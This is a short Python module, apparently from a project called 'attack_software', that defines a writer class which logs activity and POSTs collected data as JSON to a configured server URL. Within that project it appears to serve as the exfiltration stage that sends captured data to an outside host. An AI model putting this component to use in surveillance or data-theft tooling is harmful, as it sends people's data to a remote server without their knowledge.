import os
import requests
import logging
from iwriter import IWriter
from attack_software.config.config import NAME_FILE_LOG_NETWORK_WRITER,URL_FOR_SEND_SERVER

log_folder = os.path.dirname(NAME_FILE_LOG_NETWORK_WRITER)
os.makedirs(log_folder, exist_ok=True)

logging.basicConfig(filename=NAME_FILE_LOG_NETWORK_WRITER,level=logging.INFO,format="%(asctime)s - %(levelname)s - %(message)s")
logging.info('Logging system initialized successfully!')

class WriterNetwork(IWriter):


    def send_data(self,data: str) -> None:

        """
        Sends data to a server via an HTTP POST request.

        Parameters:
        data (str): The data to be sent to the server.

        If data is provided, it logs a success message. If no data is received,
        it logs a warning. Then, the data is wrapped in a dictionary and sent
        to the specified server URL.
        """

        if data:
            logging.info('The information was received successfully')
        else:
            logging.warning('Error: No data received')
        dict_data = {"data":data}
        logging.info('A dictionary is created')
        response = requests.post(URL_FOR_SEND_SERVER,json=dict_data)
        logging.info(f'The server response is: {response}')


if __name__ == '__main__':
    pass